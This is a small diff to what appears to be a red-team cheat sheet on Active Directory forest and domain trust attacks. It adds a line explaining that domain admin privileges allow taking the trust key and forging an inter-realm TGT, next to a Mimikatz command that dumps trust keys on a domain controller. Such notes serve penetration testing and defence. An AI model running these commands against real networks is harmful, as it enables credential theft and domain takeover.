@@ -842,6 +842,7 @@ https://blog.harmj0y.net/redteaming/not-a-security-boundary-breaking-forest-trus
 https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1
 
 #### Child to Parent - Trust
+Therefore, if we get the trust key we can forge an Inter-realm TGT and traverse domains. There are multiple ways to achieve this once in possession of DA prvileges:
 
 On the DC:
 ```Invoke-Mimikatz -Command '"lsadump::trust /patch"'```
